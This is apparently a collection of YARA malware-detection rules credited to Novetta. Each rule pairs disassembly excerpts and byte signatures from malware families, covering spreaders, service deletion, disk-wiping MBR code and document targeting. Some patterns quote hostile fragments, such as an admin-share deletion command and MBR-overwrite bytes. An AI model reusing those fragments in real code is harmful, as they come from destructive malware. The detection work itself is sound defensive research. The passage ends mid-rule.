  "RomeoWhiskey_Two": "rule RomeoWhiskey_Two\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"a8d88714f0bc643e76163d1b8972565e78a159292d45a8218d0ad0754c8f561d\"\n\n\tstrings:\n\t/*\n\t\tFF 15 78 A2 00 10  call    GetTickCount_9\n\t\t66 8B C8           mov     cx, ax\n\n\t\t// the next op is a mov or a push/pop depending on the code version\n\t\t53                 push    ebx\n\t\t8F 45 F4           pop     dword ptr [ebp-0Ch]\n\t\t//or\n\t\t89 5D F4           mov     dword ptr [ebp+var_C], ebx\n\t\t\n\t\t\n\t\t66 81 F1 40 1C     xor     cx, 1C40h\n\t\t66 D1 E9           shr     cx, 1\n\t\t81 C1 E0 56 00 00  add     ecx, 56E0h\n\t\t0F B7 C9           movzx   ecx, cx\n\t\t0F B7 C0           movzx   eax, ax\n\t\t81 F1 30 32 00 00  xor     ecx, 3230h\n\t\tC1 E0 10           shl     eax, 10h\n\t\t0B C8              or      ecx, eax\n\t*/\n\n\t$a = {FF 15 [4] 66 8B C8 [3-4] \t66 81 F1 40 1C \t66 D1 E9 81 C1 E0 56 00 00 0F B7 C9 0F B7 C0 81 F1 30 32 00 00 \tC1 E0 10 0B C8 }\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "RomeoWhiskey_One": "rule RomeoWhiskey_One\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"5d21e865d57e9798ac7c14a6ad09c4034d103f3ea993295dcdf8a208ea825ad7\"\n\n\tstrings:\n\t/*\n\t\tFF 15 D8 5B 00 10  call    GetTickCount_9\n\t\t0F B7 C0           movzx   eax, ax\n\t\t8B C8              mov     ecx, eax\n\t\t// skipped: 6A 01              push    1               ; fDecode\n\t\tC1 E9 34           shr     ecx, 34h         <--- this value could change\n\t\t81 F1 C0 F3 00 00  xor     ecx, 0F3C0h\t\t\t<--- this value could change\n\t\t// skipped: 6A 04              push    4               ; dwLength\n\t\tC1 E0 10           shl     eax, 10h\n\t\t0B C8              or      ecx, eax\n\t*/\n\n\t$a = {\tFF 15 [4]  0F B7 C0 8B C8 [2-4] C1 E9 ?? 81 F1 [2] 00 00 [0-2] \tC1 E0 10 0B C8 \t}\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "SierraAlfa": "rule SierraAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"4d4b17ddbcf4ce397f76cf0a2e230c9d513b23065f746a5ee2de74f447be39b9.ex_\"\n\n\tstrings:\n\t/*\n\t\t8D 54 24 08              lea     edx, [esp+128h+argp]\n\t\t52                       push    edx             ; argp\n\t\t68 7E 66 04 80           push    8004667Eh       ; cmd\n\t\t56                       push    esi             ; s\n\t\tE8 DB 51 00 00           call    ioctlsocket\n\t\t8D 44 24 14              lea     eax, [esp+128h+name]\n\t\t6A 10                    push    10h             ; namelen\n\t\t50                       push    eax             ; name\n\t\t56                       push    esi             ; s\n\t\tE8 C8 51 00 00           call    connect\n\t\t8B 8C 24 34 01 00 00     mov     ecx, [esp+128h+dwTimeout]\n\t\t8D 54 24 0C              lea     edx, [esp+128h+timeout]\n\t\t52                       push    edx             ; timeout\n\t\t8D 44 24 28              lea     eax, [esp+12Ch+writefds]\n\t\t6A 00                    push    0               ; exceptfds\n\t\t50                       push    eax             ; writefds\n\t\t6A 00                    push    0               ; readfds\n\t\t6A 00                    push    0               ; nfds\n\t\t89 74 24 3C              mov     [esp+13Ch+writefds.fd_array], esi\n\t\t89 7C 24 38              mov     [esp+13Ch+writefds.fd_count], edi\n\t\t89 4C 24 20              mov     [esp+13Ch+timeout.tv_sec], ecx\n\t\tC7 44 24 24 00 00 00 00  mov     [esp+13Ch+timeout.tv_usec], 0\n\t\tE8 92 51 00 00           call    select\n\t\t33 C9                    xor     ecx, ecx\n\t\t56                       push    esi             ; s\n\t\t85 C0                    test    eax, eax\n\t\t0F 9F C1                 setnle  cl\n\t\t8B F9                    mov     edi, ecx\n\t\tE8 7D 51 00 00           call    closesocket\n\t*/\n\n\t$connectTest = {8D [3] 5? 68 7E 66 04 80 5? E8 [4] 8D [3] 6A 10 5? 5? E8 [4] 8B [6] 8D [3] 5? 8D [3] 6A 00 5? 6A 00 6A 00 89 [3] 89 [3] 89 [3] C7 [7] E8 [4] 33 ?? 5? 85 C0 0F 9F ?? 8B ?? E8}\n\n\t/*\n\t\tE8 D8 62 00 00                                call    rand\n\t\t8B F8                                         mov     edi, eax\n\t\tE8 D1 62 00 00                                call    rand\n\t\t0F AF F8                                      imul    edi, eax\n\t\tE8 C9 62 00 00                                call    rand\n\t\t0F AF C7                                      imul    eax, edi\n\t\t99                                            cdq\n\t\t33 C2                                         xor     eax, edx\n\t\t2B C2                                         sub     eax, edx\n\t\t33 D2                                         xor     edx, edx\n\t\tF7 F6                                         div     esi\n\t\t8B FA                                         mov     edi, edx\n\t\t57                                            push    edi\n\t\tE8 05 13 00 00                                call    sub_402BD0\n\t*/\n\t \t$maths = { E8 [4] 8B ?? E8 [4] 0F AF ?? E8 [4] 0F AF ?? 99 33 ?? 2B ?? 33 ?? F7 ?? 8B ?? 5? E8}\n\t\t\n\t\t$s1 = \"recdiscm32.exe\"\n\t\t$s2 = \"\\\\\\\\%s\\\\shared$\\\\syswow64\"\n\t\t$s3 = \"\\\\\\\\%s\\\\shared$\\\\system32\"\n\n\tcondition:\n\t\t$connectTest in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $maths in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor 3 of ($s*)\n\n}",
  "SierraBravo_Two": "rule SierraBravo_Two\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t/*\n\t\t.text:00403D5A                 mov     word ptr [esi+0Eh], 0C807h\n\t\t.text:00403D60                 mov     dword ptr [esi+39h], 800000D4h\n\t\t.text:00403D67                 mov     byte ptr [edi], 0Ch\t\t\t\t\t\t\t<---- ignored\n\t\t.text:00403D6A                 mov     word ptr [esi+25h], 0FFh\n\t\t.text:00403D70                 mov     word ptr [esi+27h], 0A4h\n\t\t.text:00403D76                 mov     word ptr [esi+29h], 4104h\n\t\t.text:00403D7C                 mov     word ptr [esi+2Bh], 32h\n\t\t\n\t\tor\n\t\t\n\t\t.text:100036F9                 mov     word ptr [ebx+0Eh], 0C807h\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t---- begin ignored -----\n\t\t.text:100036FF                 rep movsd\n\t\t.text:10003701                 lea     edi, [ebx+60h]\n\t\t.text:10003704                 mov     ecx, 9\n\t\t.text:10003709                 mov     esi, offset aWindows2000219 ; \"windows 2000 2195\"\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t---- end ignored -----\n\t\t.text:1000370E                 mov     dword ptr [ebx+39h], 800000D4h\n\t\t.text:10003715                 mov     word ptr [ebx+25h], 0FFh\n\t\t.text:1000371B                 mov     word ptr [ebx+27h], 0A4h\n\t\t.text:10003721                 mov     word ptr [ebx+29h], 4104h\n\t\t.text:10003727                 mov     word ptr [ebx+2Bh], 32h\n\t\t*/\n\t\t$smbComNegotiationPacketGen = { 66 C7 ?? 0E 07 C8 [0-32] C7 ?? 39 D4 00 00 80 [0-32] 66 C7 ?? 25 FF 00 [0-32] 66 C7 ?? 27 A4 00 [0-32]\t66 C7 ?? 29 04 41 [0-32] 66 C7 ?? 2B 32 00}\n\n\t\t$lib = \"!emCFgv7Xc8ItaVGN0bMf\"\n\t\t$api1 = \"!ctRHFEX5m9JnZdDfpK\"\n\t\t$api2 = \"!emCFgv7Xc8ItaVGN0bMf\"\n\t\t$api3 = \"!VWBeBxYx1nzrCkBLGQO\"\t\t\n\t\t$pwd = \"iamsorry!@1234567\"\t\t\t\t\t\t\t\t\t\t\n\n\t\t\n\tcondition:\n\t\t$smbComNegotiationPacketGen in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor ($pwd in ((pe.sections[pe.section_index(\".data\")].raw_data_offset)..(pe.sections[pe.section_index(\".data\")].raw_data_offset + pe.sections[pe.section_index(\".data\")].raw_data_size))\n\t\t \t\tand \n\t\t \t\t($lib in ((pe.sections[pe.section_index(\".data\")].raw_data_offset)..(pe.sections[pe.section_index(\".data\")].raw_data_offset + pe.sections[pe.section_index(\".data\")].raw_data_size))\n\t\t\t\tor $api1 in ((pe.sections[pe.section_index(\".data\")].raw_data_offset)..(pe.sections[pe.section_index(\".data\")].raw_data_offset + pe.sections[pe.section_index(\".data\")].raw_data_size))\n\t\t\t\tor $api2 in ((pe.sections[pe.section_index(\".data\")].raw_data_offset)..(pe.sections[pe.section_index(\".data\")].raw_data_offset + pe.sections[pe.section_index(\".data\")].raw_data_size))\n\t\t\t\tor $api3 in ((pe.sections[pe.section_index(\".data\")].raw_data_offset)..(pe.sections[pe.section_index(\".data\")].raw_data_offset + pe.sections[pe.section_index(\".data\")].raw_data_size))\n\t\t))\n\n}",
  "SierraBravo_One": "rule SierraBravo_One\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t/*\n\t\t\t.text:00402A65                 push    8004667Eh       ; cmd\n\t\t\t.text:00402A6A                 push    esi             ; s\n\t\t\t.text:00402A6B                 call    ioctlsocket\n\t\t\t.text:00402A70                 push    32h             ; dwMilliseconds\n\t\t\t.text:00402A72                 mov     [esp+24Ch+writefds.fd_array], esi\n\t\t\t.text:00402A79                 mov     [esp+24Ch+writefds.fd_count], 1\n\t\t\t.text:00402A84                 mov     [esp+24Ch+timeout.tv_sec], 3\n\t\t\t.text:00402A8C                 mov     [esp+24Ch+timeout.tv_usec], 0\t\t\t\n\t\t*/\n\t\t$spreaderSetup = {68 7E 66 04 80 5? E8 [4] 6A 32 89 B4 [5] C7 84 [5] 01 00 00 00 C7 44 [2] 03 00 00 00 C7 44 [2] 00 00 00 00 }\n\n\tcondition:\n\t\t$spreaderSetup in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "SierraBravo_packed": "rule SierraBravo_packed\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"cmd.exe /c \\\"net share admin$ /d\\\"\"\n\t\t$ = \"MAIL FROM:<\"\n\t\t$ = \".petite\"\n\t\t$ = \"Subject: %s|%s|%s\"\n\tcondition:\n\t\t3 of them\n\t\n}",
  "SierraCharlie": "rule SierraCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"f4750e1d82b08318bdc1eb6d3399dee52750250f7959a5e4f83245449f399698.bin\"\n\n\tstrings:\n\t/*\n\t\t8B 0D 50 A7 56 00  mov     ecx, DnsFree\n\t\t81 F6 8C 3F 7C 5E  xor     esi, 5E7C3F8Ch\n\t\t6A 01              push    1               ; _DWORD\n\t\t50                 push    eax             ; _DWORD\n\t\t85 C9              test    ecx, ecx\n\t\t74 3A              jz      short loc_40580B\n\t\tFF D1              call    ecx ; DnsFree\n\t*/\n\n\t$dnsResolve = {\t8B 0D 50 A7 56 00 81 F6 8C 3F 7C 5E 6A 01 50 85 C9 74 3A FF D1 \t}\n\t\t\n\t$file1 = \"wmplog21t.sqm\"\n\t$file2 = \"wmplog15r.sqm\"\n\t$file3 = \"wmplog09c.sqm\"\n\t\t\n\n\tcondition:\n\t\t$dnsResolve in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor 2 of ($file*)\n}",
  "SierraJuliettMikeOne": "rule SierraJuliettMikeOne\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$commKey = { 10 20 30 40 50 60 70 80 90 11 12 13 1A FF EE 48 }\n\t\t/*\n\t\t.text:10001850                 push    7530h           ; dwTimeout\n\t\t.text:10001855                 lea     eax, [esp+420h+a2]\n\t\t.text:10001859                 push    4               ; len\n\t\t.text:1000185B                 push    eax             ; a2\n\t\t.text:1000185C                 push    esi             ; s\n\t\t.text:1000185D                 mov     dword ptr [esp+42Ch+a2], 1000h\n\t\t.text:10001865                 call    CommSendWithTimeout\n\t\t.text:1000186A                 add     esp, 14h\n\t\t.text:1000186D                 cmp     eax, 0FFFFFFFFh\n\t\t.text:10001870                 jz      loc_10001915\n\t\t.text:10001876                 lea     ecx, [esp+418h+random]\n\t\t.text:1000187A                 push    ecx             ; a1\n\t\t.text:1000187B                 call    Generate16ByteRandomBuffer\n\t\t.text:10001880                 push    0               ; fEncrypt\n\t\t.text:10001882                 push    7530h           ; dwTimeout\t\t\n\t\t*/\n\t\t$handshake = { 68 30 75 00 00 [4] 6A 04 5? 5? C? [3] 00 10 00 00 E8 [7] 83 F8 FF 0F 84 ?? ?? 00 00 8? [3] 5? E8 [4] 6A 00 68 30 75 00 00 }\n\t\t\n\tcondition:\n\t\t$commKey in ((pe.sections[pe.section_index(\".data\")].raw_data_offset)..(pe.sections[pe.section_index(\".data\")].raw_data_offset + pe.sections[pe.section_index(\".data\")].raw_data_size))\n\t\tand $handshake in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\n}",
  "RomeoJuliettMikeTwo": "rule RomeoJuliettMikeTwo\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"819722ba1c5b9d0b360c54cbdd3811d0cac1a9230720b3ed4815f78bcacb3653_d1ba9ba2987f59d99ce4bf09393c0521c4d1f2961c5aeed4e0bf86e78303d27c\"\n\n\tstrings:\n\t/*\n\t\t81 7C 24 24 33 27 00 00  cmp     [esp+1Ch+dwBytesToRead], 2733h\n\t\t75 7F                    jnz     short loc_10002B74\n\t\t8D 54 24 14              lea     edx, [esp+1Ch+var_8]\n\t\t52                       push    edx             ; Time\n\t\tFF 15 5C 11 02 10        call    ds:time\n\t\t8B 44 24 14              mov     eax, [esp+20h+var_C]\n\t\t83 C4 04                 add     esp, 4\n\t\t8B C8                    mov     ecx, eax\n\t\t40                       inc     eax\n\t\t83 F9 64                 cmp     ecx, 64h\n\t*/\n\n\t$recvFunc = { 81 [3] 33 27 00 00 75 ?? 8D [3] 5? FF 15 [4] 8B [3] 83 ?? 04 8B ?? 4? 83 ?? 64 }\n\n\t/*\n\t\tE8 74 31 00 00     call    GetStringByIndex\n\t\t8B 7C 24 14        mov     edi, [esp+0Ch+dwFuncIndex]\n\t\t8B F0              mov     esi, eax\n\t\t57                 push    edi             ; index\n\t\tE8 68 31 00 00     call    GetStringByIndex\n\t\t83 C4 08           add     esp, 8\n\t\t85 F6              test    esi, esi\n\t\t74 21              jz      short loc_10001040\n\t\t85 C0              test    eax, eax\n\t\t74 1D              jz      short loc_10001040\n\t\t56                 push    esi             ; lpLibFileName\n\t\tFF 15 2C 10 02 10  call    ds:LoadLibraryA\n\t\t57                 push    edi             ; index\n\t\t8B F0              mov     esi, eax\n\t\tE8 4E 31 00 00     call    GetStringByIndex\n\t\t83 C4 04           add     esp, 4\n\t\t50                 push    eax             ; lpProcName\n\t\t56                 push    esi             ; hModule\n\t\tFF 15 5C 10 02 10  call    ds:GetProcAddress\n\t*/\n\n\t$apiLoader = { E8 [4] 8B [3] 8B ?? 5? E8 [4] 83 C4 08 85 ?? 74 ?? 85 C0 74 ?? 5? FF 15 [4] 5? 8B ?? E8 [4] 83 C4 04 5? 5? FF 15 }\n\n\t/*\n\t\t68 B8 0B 00 00           push    0BB8h           ; dwMilliseconds\n\t\tFF 15 18 10 02 10        call    ds:Sleep\n\t\t6A 01                    push    1               ; dwTimeout\n\t\t8D 4C 24 10              lea     ecx, [esp+4C0h+peerEntries]\n\t\t68 B0 04 00 00           push    4B0h            ; dwBytesToRead\n\t\t51                       push    ecx             ; pvRecvBuffer\n\t\t8B CE                    mov     ecx, esi        ; this\n\t\tC7 44 24 14 B0 04 00 00  mov     [esp+4C8h+Memory], 4B0h\n\t\tE8 25 F4 FF FF           call    CClientConnection__RecvData\n\t\t83 F8 FF                 cmp     eax, 0FFFFFFFFh\n\t*/\n\n\t$recvPeers = { 68 B8 0B 00 00 FF 15 [4] 6A 01 [0-4] 68 B0 04 00 00 51 8B ?? [1-4] B0 04 00 00 E8 [4] 83 F8 FF\t}\t\t\n\t\t\n\t$logFileName = \"KBD_%%s_%%02d%%02d%%02d%%02d%%02d.CAT\"\n\t\n\tcondition:\n\t\t$recvFunc in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $apiLoader in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $recvPeers in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $logFileName\n}",
  "TangoAlfa": "rule TangoAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t// $firewall is a shared code string\n\t\t$firewall = \"%sd.e%sc n%ssh%srewa%s ad%s po%sop%sing T%s %d \\\"%s\\\"\"\n\t\t\n\t\t$testStatus1 = \"*****[Start Test -> %s:%d]\" wide\n\t\t$testStatus2 = \"*****[Relay Connect \" wide\n\t\t$testStatus3 = \"*****[Listen Port %d] - \" wide\n\t\t$testStatus4 = \"*****[Error Socket]\" wide\n\t\t$testStatus5 = \"*****[End Test]\" wide\n\n\tcondition:\n\t\t2 of them\n}",
  "TangoBravo": "rule TangoBravo\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"2aa9cd3a2db2bd9dbe5ee36d9a5fc42b50beca806f9d644f387d5a680a580896\"\n\n\tstrings:\n\t/*\n\t\t50                 push    eax             ; SubStr\n\t\t55                 push    ebp             ; Str\n\t\tFF D3              call    ebx ; strstr\n\t\t83 C4 08           add     esp, 8\n\t\t85 C0              test    eax, eax\n\t\t75 1A              jnz     short loc_401131\n\t\t8A 8E 08 01 00 00  mov     cl, [esi+108h]\n\t\t81 C6 08 01 00 00  add     esi, 108h\n\t\t47                 inc     edi\n\t\t8B C6              mov     eax, esi\n\t\t84 C9              test    cl, cl\n\t\t75 E2              jnz     short loc_40110C\n\t*/\n\n\t$targetDomainCheck = {5? 5? FF ?? 83 C4 08 85 C0 75 ?? 8? ?? 08 01 00 00 8? ?? 08 01 00 00 4? 8B ?? 84 ?? 75  }\n\n\tcondition:\n\t\t$targetDomainCheck in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "UniformAlfa": "rule UniformAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"a24377681cf56c712e544af01ac8a5dbaa81d16851a17a147bbf5132890d7437\"\n\n\tstrings:\n\t/*\n\t\t8D 44 24 10        lea     eax, [esp+2Ch+ServiceStatus]\n\t\t50                 push    eax             ; lpServiceStatus\n\t\t6A 01              push    1               ; dwControl\n\t\t56                 push    esi             ; hService\n\t\tFF D3              call    ebx ; ControlService\n\t\t83 7C 24 14 01     cmp     [esp+2Ch+ServiceStatus.dwCurrentState], 1\n\t\t75 EF              jnz     short loc_4010A5\n\t\t56                 push    esi             ; hService\n\t\tFF 15 08 70 40 00  call    ds:DeleteService\n\t*/\n\n\t$stopDeleteService = {8D [3] 5? 6A 01 5? FF D?\t83 [3] 01 75 ?? 5? FF 15}\n\n\tcondition:\n\t\t$stopDeleteService in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "UniformJuliett": "rule UniformJuliett\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"Cmd03000_1a6f62e1630d512c3b67bfdbff26270177585c82802ffa834b768ff47be0a008.bin\"\n\n\tstrings:\n\t\t/*\n\t\t\t56                 push    esi             ; hSCObject\n\t\t\tFF D5              call    ebp ; CloseServiceHandle\n\t\t\t68 B8 0B 00 00     push    0BB8h           ; dwMilliseconds\n\t\t\tFF 15 38 70 40 00  call    ds:Sleep\n\t\t\t6A 00              push    0               ; fCreateHighestLevel\n\t\t\t68 60 A9 40 00     push    offset PathName ; lpPathName\n\t\t\tE8 43 FE FF FF     call    RecursivelyCreateDirectories\n\t\t\t83 C4 08           add     esp, 8\n\t\t\t68 60 A9 40 00     push    offset PathName ; lpFileName\n\t\t\tFF 15 3C 70 40 00  call    ds:DeleteFileA\n\t\t*/\n\t\t\n\t\t$a = {56 FF D5 68 B8 0B 00 00 FF 15 [4] 6A 00 68 [4] E8 [4] 83 C4 08 68 [4] FF 15}\n\t\t\n\t\t$ = \"wauserv.dll\"\n\t\t$ = \"Rpcss\"\n\t\n\tcondition:\n\t\tall of them\n}",
  "WhiskeyAlfa": "rule WhiskeyAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"1c66e67a8531e3ff1c64ae57e6edfde7bef2352d.ex_\"\n\n\tstrings:\n\t/*\n\t\tE8 77 07 00 00     call    _rand\n\t\tB1 FB              mov     cl, 0FBh\n\t\tF6 E9              imul    cl\n\t\t88 44 34 08        mov     [esp+esi+10008h+randomData], al\n\t\t46                 inc     esi\n\t\t81 FE 00 00 01 00  cmp     esi, 10000h\n\t\t7C EA              jl      short loc_402E8D\n\t*/\n\n\t$randomBuffer = {E8 [4] B1 ?? F6 E9 88 [3] 4? 81 ?? 00 00 01 00 7C}\n\n\t/*\n\t\t89 58 09              mov     [eax+9], ebx\n\t\tC7 40 65 00 00 02 00  mov     dword ptr [eax+65h], 20000h\n\t\tC7 40 15 04 00 00 00  mov     dword ptr [eax+15h], 4\n\t\tC6 40 08 08           mov     byte ptr [eax+8], 8\n\t\tC7 40 04 00 02 00 00  mov     dword ptr [eax+4], 200h\n\t\t89 18                 mov     [eax], ebx\n\t\t89 58 0D              mov     [eax+0Dh], ebx\n\t\tC7 40 11 01 00 00 00  mov     dword ptr [eax+11h], 1\n\t\t89 58 69              mov     [eax+69h], ebx\n\t\t89 58 19              mov     [eax+19h], ebx\n\t\tB8 01 00 00 00        mov     eax, 1\n\t*/\n\t$mbrDiskInfo = {89 ?? 09 C7 ?? 65 00 00 02 00 C7 ?? 15 04 00 00 00 C6 ?? 08 08 C7 ?? 04 00 02 00 00 89 ?? 89 ?? 0D C7 ?? 11 01 00 00 00 89 ?? 69 89 ?? 19 B8 01 00 00 00}\n\t\t\n\n\t\t// the replacement MBRs in both encoded (XOR 0x53) and decoded form\t\t\n\t\t$mbrReplacement_Decoded = { B4 43 B0 00 CD 13 FE C2 80 FA 84 7C F3 B2 80 BF 65 7C 81 05 00 04 83 55 02 00 83 55 04 00 }\n\t\t$mbrReplacement_Encoded = { E7 10 E3 53 9E 40 AD 91 D3 A9 D7 2F A0 E1 D3 EC 36 2F D2 56 53 57 D0 06 51 53 D0 06 57 53 }\n\t\n\t\t$licKey = \"99E2428CCA4309C68AAF8C616EF3306582A64513E55C786A864BC83DAFE0C78585B692047273B0E55275102C664C5217E76B8E67F35FCE385E4328EE1AD139EA6AA26345C4F93000DBBC7EF1579D4F\"\n\t\t\n\tcondition:\n\t\t$licKey or $mbrReplacement_Decoded or $mbrReplacement_Encoded\n\t\tor $randomBuffer in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $mbrDiskInfo in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "WhiskeyBravo": "rule WhiskeyBravo\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"74eac0461c40316689ac2d598f606caa3965195b22f23d5acefeedfcdf056c5b\"\n\t\tSource = \"d079a266ed2a852c33cdac3df115d163ebbf2c8dae32d935e895cf8193163b13\"\n\n\tstrings:\n\t/*\n\t\t6A 04              push    4               ; MaxCount  <--- this arg is not found in some variants (41bad..) as wcscmp is used instead\n\t\t68 08 82 00 10     push    offset Str2     ; \".doc\"\n\t\t56                 push    esi             ; Str1\n\t\tFF D7              call    edi ; _wcsnicmp            <--- d07... variant uses a direct call instead\n\t\t83 C4 0C           add     esp, 0Ch\t\t\t\t\t\t\t\t\t\t<--- when wcscmp is used, this is add esp, 8\n\t\t85 C0              test    eax, eax\n\t\t0F 84 5B 02 00 00  jz      loc_100017D5\n\t\t6A 05              push    5               ; MaxCount\n\t\t68 FC 81 00 10     push    offset a_docx   ; \".docx\"\n\t\t56                 push    esi             ; Str1\n\t\tFF D7              call    edi ; _wcsnicmp\n\t\t83 C4 0C           add     esp, 0Ch\n\t\t85 C0              test    eax, eax\n\t\t0F 84 46 02 00 00  jz      loc_100017D5\n\t\t6A 04              push    4               ; MaxCount\n\t\t68 F0 81 00 10     push    offset a_docm   ; \".docm\"\n\t\t56                 push    esi             ; Str1\n\t\tFF D7              call    edi ; _wcsnicmp\n\t\t83 C4 0C           add     esp, 0Ch\n\t\t85 C0              test    eax, eax\n\t\t0F 84 31 02 00 00  jz      loc_100017D5\n\t\t6A 04              push    4               ; MaxCount\n\t\t68 E4 81 00 10     push    offset a_wpd    ; \".wpd\"\n\t\t56                 push    esi             ; Str1\n\t\tFF D7              call    edi ; _wcsnicmp\n\t*/\n\n\t$a = {68 [4] 5? FF D? 83 C4 0C 85 C0 0F 84 [4] [0-2] 68 [4] 5? FF D? 83 C4 0C 85 C0 0F 84 [4] [0-2] 68 [4] 5? FF D? 83 C4 0C 85 C0 0F 84 }\n\n\t$ext1 = \".wpd\" wide nocase\n\t$ext2 = \".doc\" wide nocase\n\t$ext3 = \".hwp\" wide nocase\n\t\n\tcondition:\n\t\t2 of ($ext*) and $a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "WhiskeyCharlie": "rule WhiskeyCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"47ff4f73738acc2f8433dccb2caf980d7444d723ccf2968d69f88f8f96405f96\"\n\n\tstrings:\n\t/*\n\t\t66 89 55 DC     mov     [ebp+SystemTime.wYear], dx\n\t\tE8 1E 16 00 00  call    _rand\n\t\t6A 0C           push    0Ch\n\t\t99              cdq\n\t\t59              pop     ecx\n\t\tF7 F9           idiv    ecx\n\t\t42              inc     edx\n\t\t66 89 55 DE     mov     [ebp+SystemTime.wMonth], dx\n\t\tE8 0E 16 00 00  call    _rand\n\t\t6A 1C           push    1Ch\n\t\t99              cdq\n\t\t59              pop     ecx\n\t\tF7 F9           idiv    ecx\n\t\t42              inc     edx\n\t\t66 89 55 E2     mov     [ebp+SystemTime.wDay], dx\n\t\tE8 FE 15 00 00  call    _rand\n\t\t6A 18           push    18h\n\t\t99              cdq\n\t\t59              pop     ecx\n\t\tF7 F9           idiv    ecx\n\t\t66 89 55 E4     mov     [ebp+SystemTime.wHour], dx\n\t\tE8 EF 15 00 00  call    _rand\n\t\t6A 3C           push    